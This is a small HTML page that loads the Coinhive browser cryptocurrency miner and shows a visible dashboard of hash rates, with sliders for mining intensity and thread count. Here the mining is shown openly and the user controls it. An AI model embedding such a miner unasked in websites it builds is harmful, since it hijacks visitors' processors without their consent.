<html>
    <head>
        <meta charset="utf-8">
        <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
        <script src="https://coin-hive.com/lib/captcha.min.js" async></script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
        <link rel="stylesheet" href="main.css">
        <script src="main.js"></script>
    </head>
    <body>

        <section class="hashContainer">
            <div class="header">Hashes</div>
            <div class="headerHPS">Hashes per second</div>
            <div class="headerTH">Total hashes</div>
            <div class="headerAH">Accepted hashes</div>
            <div class="HPS"></div>
            <div class="TH"></div>
            <div class="AH"></div>
            <div class="log"></div>
        </section>

        <b>no mining</b><input type="range" id="throttle" class="settingSlider" type="text" data-slider-min="0" data-slider-max="1" data-slider-step="0.1" data-slider-value="0"/><b>full mining</b>
        <b>1 thread</b><input type="range" id="threads" class="settingSlider" type="text" data-slider-min="1" data-slider-max="8" data-slider-step="1" data-slider-value="1"/><b>8 threads</b>

</html>
